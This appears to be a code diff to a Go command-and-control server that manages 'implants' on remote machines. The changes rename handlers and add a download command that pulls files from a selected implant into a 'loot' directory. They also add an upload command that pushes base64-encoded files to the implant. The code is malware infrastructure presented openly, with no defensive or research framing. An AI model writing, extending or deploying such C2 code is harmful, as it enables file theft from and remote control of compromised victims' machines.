@@ -11,6 +11,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
@@ -73,7 +74,7 @@ func main() {
 	}
 	defer ln2.Close()
 
-	go acceptLoopRemote(ln2)
+	go acceptLoopCLI(ln2)
 
 	// Handle graceful shutdown
 	sigChan := make(chan os.Signal, 1)
@@ -146,7 +147,7 @@ func isClientAlive(client *Client) bool {
 	return decryptedResponse == "pong"
 }
 
-func acceptLoopRemote(ln net.Listener) {
+func acceptLoopCLI(ln net.Listener) {
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
@@ -154,11 +155,11 @@ func acceptLoopRemote(ln net.Listener) {
 			continue
 		}
 
-		go handleNewConnectionRemote(conn)
+		go handleNewConnectionCLI(conn)
 	}
 }
 
-func handleNewConnectionRemote(conn net.Conn) {
+func handleNewConnectionCLI(conn net.Conn) {
 	defer conn.Close()
 
 	reader := bufio.NewReader(conn)
@@ -190,7 +191,7 @@ func handleNewConnectionRemote(conn net.Conn) {
 		}
 
 		if strings.HasPrefix(decryptedCommand, "select ") {
-			handleSelectCommandRemote(decryptedCommand)
+			handleSelectCommandCLI(decryptedCommand)
 			cur := getCurrentClientId()
 			curr_string := fmt.Sprintf("%v", cur)
 			sendResponseRemote(conn, curr_string)
@@ -209,10 +210,14 @@ func handleNewConnectionRemote(conn net.Conn) {
 			continue
 		}
 		if strings.HasPrefix(decryptedCommand, "download") {
-			fmt.Println("We dl")
 			resp := handleImplantCommand(currentClient, command)
-			fmt.Println(resp)
-			saveFile(command, resp)
+			saveFilePath(decryptedCommand, resp)
+			sendResponseRemote(conn, "Downloaded File: "+decryptedCommand)
+			continue
+		}
+		if strings.HasPrefix(decryptedCommand, "upload") {
+			handleUpload(currentClient, decryptedCommand)
+			//sendResponseRemote(conn, "Uploaded File: "+decryptedCommand)
 			continue
 		}
 		if currentClient == nil {
@@ -289,7 +294,7 @@ func acceptLoopImplant(ln net.Listener) {
 	}
 }
 
-func handleSelectCommandRemote(command string) {
+func handleSelectCommandCLI(command string) {
 	parts := strings.SplitN(command, " ", 2)
 	if len(parts) != 2 {
 		log.Println("Invalid select command. Use 'select <implant_id>'")
@@ -388,6 +393,42 @@ func saveFile(command, content string) {
 	log.Printf("File %s downloaded successfully\n", fileName)
 }
 
+func saveFilePath(command, content string) {
+	prefix := "download "
+
+	if !strings.HasPrefix(command, prefix) {
+		log.Println("Invalid download command format")
+		return
+	}
+
+	// Extract the file path from the command
+	filePath := strings.TrimPrefix(command, prefix)
+
+	// Create the "loot" directory if it doesn't exist
+	lootDir := "loot"
+	if _, err := os.Stat(lootDir); os.IsNotExist(err) {
+		err := os.Mkdir(lootDir, 0755) // or 0700 if you want it to be accessible only by the user
+		if err != nil {
+			log.Println("Error creating directory:", err)
+			return
+		}
+	}
+
+	// Assuming we always save in the "loot" directory
+	// Extract just the file name from the path
+	_, fileName := filepath.Split(filePath)
+	filePathInLoot := filepath.Join(lootDir, fileName)
+
+	// Write the file
+	err := os.WriteFile(filePathInLoot, []byte(content), 0644)
+	if err != nil {
+		log.Println("Error saving file:", err)
+		return
+	}
+
+	log.Printf("File %s downloaded successfully\n", filePathInLoot)
+}
+
 func handleUpload(client *Client, command string) bool {
 	parts := strings.Fields(command)
 	if len(parts) != 3 {
@@ -406,11 +447,7 @@ func handleUpload(client *Client, command string) bool {
 	encodedData := base64.StdEncoding.EncodeToString(fileData)
 	uploadCommand := fmt.Sprintf("upload %s %s", remotePath, encodedData)
 
-	_, err = client.conn.Write([]byte(uploadCommand + "\n"))
-	if err != nil {
-		log.Println("Error sending upload command:", err)
-		return false
-	}
+	sendResponseRemote(client.conn, uploadCommand)
 
 	return true
 }
